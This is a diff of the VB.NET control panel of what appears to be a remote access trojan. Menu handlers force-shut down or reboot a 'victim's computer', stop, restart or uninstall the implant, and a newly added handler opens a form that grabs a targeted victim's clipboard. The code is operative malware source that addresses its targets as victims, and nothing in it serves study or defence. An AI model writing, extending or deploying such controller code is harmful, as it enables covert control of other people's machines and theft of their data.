@@ -130,17 +130,17 @@ Public Class RatPanel
     End Sub
 
     Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
                               {"shutdown /s /f /t 0"})
     End Sub
 
     Private Sub RebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RebootToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
                               {"shutdown /r /f /t 0"})
     End Sub
 
     Private Sub RATShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATShutdownToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
+        RunDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
     End Sub
 
     Private Sub ScreenMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenMonitorToolStripMenuItem.Click
@@ -171,11 +171,11 @@ Public Class RatPanel
     End Sub
 
     Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
     End Sub
 
     Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
     End Sub
 
     Private Sub UserBlacklistToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserBlacklistToolStripMenuItem.Click
@@ -210,6 +210,12 @@ Public Class RatPanel
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
         form.Show()
     End Sub
+    Private Sub GetClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetClipboardToolStripMenuItem.Click
+        Dim form As New GetClipboard()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
 #End Region
 #Region "UnspecificEvents"
     Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
@@ -250,5 +256,7 @@ Public Class RatPanel
     Private Sub Button1_Click(sender As Object, e As EventArgs)
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
     End Sub
+
+
 #End Region
 End Class
